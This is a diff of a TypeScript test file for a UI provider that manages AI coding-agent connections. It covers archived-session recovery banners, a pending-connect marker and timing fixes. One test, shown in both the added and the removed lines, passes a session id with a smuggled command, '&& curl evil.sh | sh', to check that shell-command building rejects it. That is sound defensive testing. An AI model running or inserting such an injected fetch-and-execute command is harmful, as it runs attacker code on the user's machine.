+  it("names the unarchive command using the id off the event, not the error body", async () => {
+    const handlers = await connectOwner("codex")
+
+    emitAcpEvent(handlers, {
+      seq: 1,
+      connection_id: "spawned-conn",
+      type: "session_load_failed",
+      session_id: ARCHIVED_SID,
+      message: RAW,
+      code: "session_archived",
+    })
+
+    expect(h.store!.getConnection(TAB)!.loadError).toMatch(
+      /^backendErrors\.sessionArchived/
+    )
+    // The point of the banner: the exact command, built from the session the
+    // load failed for — no scraping of the (reword-able) error body.
+    expect(lastArchivedCall()?.[1]?.command).toBe(
+      `codex unarchive ${ARCHIVED_SID}`
+    )
+    // Parked beside the message too: the banner renders the prose in a
+    // single-line ellipsized strip, so the copy action is what actually
+    // gets the id into the user's hands.
+    expect(h.store!.getConnection(TAB)!.loadErrorCommand).toBe(
+      `codex unarchive ${ARCHIVED_SID}`
+    )
+  })
+
+  it("still names the command when the error body does not spell out the id", async () => {
+    // The id is carried by the event, so the banner survives codex rewording
+    // its error text — the failure mode of recovering the id from the body.
+    const handlers = await connectOwner("codex")
+
+    emitAcpEvent(handlers, {
+      seq: 1,
+      connection_id: "spawned-conn",
+      type: "session_load_failed",
+      session_id: ARCHIVED_SID,
+      message: "Internal error: this session is archived",
+      code: "session_archived",
+    })
+
+    expect(h.store!.getConnection(TAB)!.loadError).toMatch(
+      /^backendErrors\.sessionArchived/
+    )
+    expect(lastArchivedCall()?.[1]?.command).toBe(
+      `codex unarchive ${ARCHIVED_SID}`
+    )
+    // Parked beside the message too: the banner renders the prose in a
+    // single-line ellipsized strip, so the copy action is what actually
+    // gets the id into the user's hands.
+    expect(h.store!.getConnection(TAB)!.loadErrorCommand).toBe(
+      `codex unarchive ${ARCHIVED_SID}`
+    )
+  })
+
+  it("refuses to build a shell command from a session id that isn't one", async () => {
+    // The command is meant to be pasted into a shell, so the id must be the
+    // whole of what gets interpolated. An id carrying a space and a second
+    // word would otherwise arrive as a second command.
+    const handlers = await connectOwner("codex")
+
+    emitAcpEvent(handlers, {
+      seq: 1,
+      connection_id: "spawned-conn",
+      type: "session_load_failed",
+      session_id: "019bf0c4-4d1a-7c3e-9f21-6a0e5b8d2c47 && curl evil.sh | sh",
+      message: RAW,
+      code: "session_archived",
+    })
+
+    expect(h.store!.getConnection(TAB)!.loadErrorCommand).toBeNull()
+    expect(h.store!.getConnection(TAB)!.loadError).toBe(RAW)
+  })
+
+  it("offers no command for the load failures that have no way back", async () => {
+    // resource_not_found / session_unavailable are genuinely lost sessions;
+    // a copy button would imply a recovery that does not exist.
+    const handlers = await connectOwner("codex")
+
+    const codes = ["resource_not_found", "session_unavailable"] as const
+    codes.forEach((code, i) => {
+      emitAcpEvent(handlers, {
+        seq: i + 1,
+        connection_id: "spawned-conn",
+        type: "session_load_failed",
+        session_id: ARCHIVED_SID,
+        message: RAW,
+        code,
+      })
+      expect(h.store!.getConnection(TAB)!.loadErrorCommand).toBeNull()
+    })
+  })
+
+  it("drops the command when the load error is cleared", async () => {
+    // Reload clears the banner; a stale command would outlive the failure it
+    // belongs to and reappear beside the next one.
+    const handlers = await connectOwner("codex")
+
+    emitAcpEvent(handlers, {
+      seq: 1,
+      connection_id: "spawned-conn",
+      type: "session_load_failed",
+      session_id: ARCHIVED_SID,
+      message: RAW,
+      code: "session_archived",
+    })
+    expect(h.store!.getConnection(TAB)!.loadErrorCommand).not.toBeNull()
+
+    act(() => {
+      h.actions!.clearAcpLoadError(TAB)
+    })
+    expect(h.store!.getConnection(TAB)!.loadError).toBeNull()
+    expect(h.store!.getConnection(TAB)!.loadErrorCommand).toBeNull()
+  })
+
+  it("keeps the agent's own text rather than prescribing a codex command to a non-codex agent", async () => {
+    // The backend classifies on the wire message, so "is archived" is not
+    // codex-exclusive by construction. Telling a Claude user to run
+    // `codex unarchive` would be worse than showing the raw text.
+    const handlers = await connectOwner("claude_code")
+
+    emitAcpEvent(handlers, {
+      seq: 1,
+      connection_id: "spawned-conn",
+      type: "session_load_failed",
+      session_id: ARCHIVED_SID,
+      message: RAW,
+      code: "session_archived",
+    })
+
+    expect(h.store!.getConnection(TAB)!.loadError).toBe(RAW)
+    expect(
+      h.tCalls.some(([key]) => key === "backendErrors.sessionArchived")
+    ).toBe(false)
+    // No command either — the copy button must not appear offering a codex
+    // incantation to a Claude session.
+    expect(h.store!.getConnection(TAB)!.loadErrorCommand).toBeNull()
   })
 })
 
@@ -14451,9 +15599,10 @@ describe("AcpConnectionsProvider canonical observer aliases", () => {
     })
 
     expect(notify).toHaveBeenCalled()
-    // prompting resets liveMessage, then content_delta appends text — both
-    // must reach the alias sink registered under the tab key.
-    expect(sink.mock.calls.length).toBeGreaterThanOrEqual(2)
+    // prompting resets liveMessage, then the flush window commits the delta.
+    await waitFor(() => {
+      expect(sink.mock.calls.length).toBeGreaterThanOrEqual(2)
+    })
     const lastLive = sink.mock.calls[sink.mock.calls.length - 1]![0]
     expect(lastLive.content).toContainEqual({
       type: "text",
@@ -15522,9 +16671,11 @@ describe("AcpConnectionsProvider canonical observer aliases", () => {
       text: "hydrated",
     })
     expect(h.store!.getConnection(TAB)?.sessionId).toBe("sess-shared")
-    expect(h.store!.getConnection(TAB)?.liveMessage?.content).toContainEqual({
-      type: "text",
-      text: "hydrated",
+    await waitFor(() => {
+      expect(h.store!.getConnection(TAB)?.liveMessage?.content).toContainEqual({
+        type: "text",
+        text: "hydrated",
+      })
     })
 
     // Same sessionId still aliases (must not rekey the connectionId entry).
@@ -16192,170 +17343,6 @@ describe("isValidConversationConnectionInfo", () => {
     expect(isValidConversationConnectionInfo({ connection_id: "x" })).toBe(
       false
     )
-  })
-})
-
-describe("session_load_failed archived-session recovery", () => {
-  async function connectOwner(agentType: string): Promise<AttachHandlers> {
-    await mountProvider()
-    await act(async () => {
-      await h.actions!.connect(TAB, agentType, "/tmp/x", "sess-1")
-    })
-    return latestAttachHandlers()
-  }
-
-  // The values the banner was built with, or undefined if it never asked for
-  // that message. (`findLast` is ES2023; this file targets ES2020.)
-  function lastArchivedCall() {
-    const calls = h.tCalls.filter(
-      ([key]) => key === "backendErrors.sessionArchived"
-    )
-    return calls[calls.length - 1]
-  }
-
-  const ARCHIVED_SID = "019bf0c4-4d1a-7c3e-9f21-6a0e5b8d2c47"
-  // What codex-acp actually answers session/load with after `codex archive`:
-  // a generic -32603 whose data spells out the session and the way back.
-  const RAW = `Internal error: {\n  "details": "session ${ARCHIVED_SID} is archived. Run \`codex unarchive ${ARCHIVED_SID}\` to restore it."\n}`
-
-  it("names the unarchive command using the id off the event, not the error body", async () => {
-    const handlers = await connectOwner("codex")
-
-    emitAcpEvent(handlers, {
-      seq: 1,
-      connection_id: "spawned-conn",
-      type: "session_load_failed",
-      session_id: ARCHIVED_SID,
-      message: RAW,
-      code: "session_archived",
-    })
-
-    expect(h.store!.getConnection(TAB)!.loadError).toContain(
-      "backendErrors.sessionArchived"
-    )
-    // The point of the banner: the exact command, built from the session the
-    // load failed for — no scraping of the (reword-able) error body.
-    expect(lastArchivedCall()?.[1]?.command).toBe(
-      `codex unarchive ${ARCHIVED_SID}`
-    )
-    // Parked beside the message too: the banner renders the prose in a
-    // single-line ellipsized strip, so the copy action is what actually
-    // gets the id into the user's hands.
-    expect(h.store!.getConnection(TAB)!.loadErrorCommand).toBe(
-      `codex unarchive ${ARCHIVED_SID}`
-    )
-  })
-
-  it("still names the command when the error body does not spell out the id", async () => {
-    // The id is carried by the event, so the banner survives codex rewording
-    // its error text — the failure mode of recovering the id from the body.
-    const handlers = await connectOwner("codex")
-
-    emitAcpEvent(handlers, {
-      seq: 1,
-      connection_id: "spawned-conn",
-      type: "session_load_failed",
-      session_id: ARCHIVED_SID,
-      message: "Internal error: this session is archived",
-      code: "session_archived",
-    })
-
-    expect(h.store!.getConnection(TAB)!.loadError).toContain(
-      "backendErrors.sessionArchived"
-    )
-    expect(lastArchivedCall()?.[1]?.command).toBe(
-      `codex unarchive ${ARCHIVED_SID}`
-    )
-    // Parked beside the message too: the banner renders the prose in a
-    // single-line ellipsized strip, so the copy action is what actually
-    // gets the id into the user's hands.
-    expect(h.store!.getConnection(TAB)!.loadErrorCommand).toBe(
-      `codex unarchive ${ARCHIVED_SID}`
-    )
-  })
-
-  it("refuses to build a shell command from a session id that isn't one", async () => {
-    // The command is meant to be pasted into a shell, so the id must be the
-    // whole of what gets interpolated. An id carrying a space and a second
-    // word would otherwise arrive as a second command.
-    const handlers = await connectOwner("codex")
-
-    emitAcpEvent(handlers, {
-      seq: 1,
-      connection_id: "spawned-conn",
-      type: "session_load_failed",
-      session_id: "019bf0c4-4d1a-7c3e-9f21-6a0e5b8d2c47 && curl evil.sh | sh",
-      message: RAW,
-      code: "session_archived",
-    })
-
-    expect(h.store!.getConnection(TAB)!.loadErrorCommand).toBeNull()
-    expect(h.store!.getConnection(TAB)!.loadError).toBe(RAW)
-  })
-
-  it("offers no command for the load failures that have no way back", async () => {
-    // resource_not_found / session_unavailable are genuinely lost sessions;
-    // a copy button would imply a recovery that does not exist.
-    const handlers = await connectOwner("codex")
-
-    const codes = ["resource_not_found", "session_unavailable"] as const
-    codes.forEach((code, i) => {
-      emitAcpEvent(handlers, {
-        seq: i + 1,
-        connection_id: "spawned-conn",
-        type: "session_load_failed",
-        session_id: ARCHIVED_SID,
-        message: RAW,
-        code,
-      })
-      expect(h.store!.getConnection(TAB)!.loadErrorCommand).toBeNull()
-    })
-  })
-
-  it("drops the command when the load error is cleared", async () => {
-    // Reload clears the banner; a stale command would outlive the failure it
-    // belongs to and reappear beside the next one.
-    const handlers = await connectOwner("codex")
-
-    emitAcpEvent(handlers, {
-      seq: 1,
-      connection_id: "spawned-conn",
-      type: "session_load_failed",
-      session_id: ARCHIVED_SID,
-      message: RAW,
-      code: "session_archived",
-    })
-    expect(h.store!.getConnection(TAB)!.loadErrorCommand).not.toBeNull()
-
-    act(() => {
-      h.actions!.clearAcpLoadError(TAB)
-    })
-    expect(h.store!.getConnection(TAB)!.loadError).toBeNull()
-    expect(h.store!.getConnection(TAB)!.loadErrorCommand).toBeNull()
-  })
-
-  it("keeps the agent's own text rather than prescribing a codex command to a non-codex agent", async () => {
-    // The backend classifies on the wire message, so "is archived" is not
-    // codex-exclusive by construction. Telling a Claude user to run
-    // `codex unarchive` would be worse than showing the raw text.
-    const handlers = await connectOwner("claude_code")
-
-    emitAcpEvent(handlers, {
-      seq: 1,
-      connection_id: "spawned-conn",
-      type: "session_load_failed",
-      session_id: ARCHIVED_SID,
-      message: RAW,
-      code: "session_archived",
-    })
-
-    expect(h.store!.getConnection(TAB)!.loadError).toBe(RAW)
-    expect(
-      h.tCalls.some(([key]) => key === "backendErrors.sessionArchived")
-    ).toBe(false)
-    // No command either — the copy button must not appear offering a codex
-    // incantation to a Claude session.
-    expect(h.store!.getConnection(TAB)!.loadErrorCommand).toBeNull()
   })
 })
 
@@ -19436,5 +20423,102 @@ describe("AcpConnectionsProvider mid-turn steering messages", () => {
 
     expect(steeringBlocks()).toEqual([])
     expect(conn().steeredMessageIds).toEqual([])
+  })
+})
+
+describe("connect() is observable while it is still in flight", () => {
+  // `acpConnect` does not return until the agent has spawned, handshaken and
+  // resumed the session — seconds to a minute for a large historical session.
+  // `CONNECTION_CREATED` (the first `status: "connecting"`) only runs after it
+  // resolves, so for that whole stretch the connections map is empty and every
+  // consumer read `null` = "idle, nothing in flight". The pending marker is
+  // what closes that gap.
+  it("publishes a pending marker before the backend call and clears it after", async () => {
+    await mountProvider()
+    let resolveConnect: (id: string) => void = () => {}
+    h.acpConnect.mockImplementation(
+      () =>
+        new Promise<string>((res) => {
+          resolveConnect = res
+        })
+    )
+
+    let connectPromise: Promise<void> | undefined
+    await act(async () => {
+      connectPromise = h.actions!.connect(
+        TAB,
+        "claude_code",
+        "/tmp/x",
+        "sess-1"
+      )
+    })
+
+    // Mid-flight: still no entry, but the key is demonstrably connecting —
+    // and it names the agent + cwd, so a status chip has something to show.
+    expect(h.store!.getConnection(TAB)).toBeUndefined()
+    expect(h.store!.getConnectPending(TAB)).toEqual({
+      agentType: "claude_code",
+      workingDir: "/tmp/x",
+    })
+
+    await act(async () => {
+      resolveConnect("spawned-conn")
+      await connectPromise
+    })
+
+    // The entry has taken over as the source of truth, so the marker retires.
+    expect(h.store!.getConnection(TAB)?.status).toBe("connecting")
+    expect(h.store!.getConnectPending(TAB)).toBeUndefined()
+  })
+
+  it("clears the marker when the connect fails, leaving no phantom `connecting`", async () => {
+    await mountProvider()
+    // The preflight rejection path: the agent is not installed, so connect()
+    // throws before it ever reaches the backend.
+    h.acpGetAgentStatus.mockResolvedValue({
+      agent_type: "claude_code",
+      enabled: true,
+      available: true,
+      installed_version: null,
+      host_tools_agent_mode: false,
+      is_acp_adapter: true,
+    })
+
+    await act(async () => {
+      await h.actions!.connect(TAB, "claude_code", "/tmp/x").catch(() => {})
+    })
+
+    expect(h.store!.getConnection(TAB)).toBeUndefined()
+    expect(h.store!.getConnectPending(TAB)).toBeUndefined()
+  })
+
+  it("wakes the key's subscribers so a mounted surface re-renders on it", async () => {
+    await mountProvider()
+    const notifications: string[] = []
+    const unsub = h.store!.subscribeKey(TAB, () =>
+      notifications.push(
+        h.store!.getConnectPending(TAB) ? "pending" : "not-pending"
+      )
+    )
+    let resolveConnect: (id: string) => void = () => {}
+    h.acpConnect.mockImplementation(
+      () =>
+        new Promise<string>((res) => {
+          resolveConnect = res
+        })
+    )
+
+    let connectPromise: Promise<void> | undefined
+    await act(async () => {
+      connectPromise = h.actions!.connect(TAB, "claude_code", "/tmp/x")
+    })
+    expect(notifications[0]).toBe("pending")
+
+    await act(async () => {
+      resolveConnect("spawned-conn")
+      await connectPromise
+    })
+    unsub()
+    expect(notifications).toContain("not-pending")
   })
 })
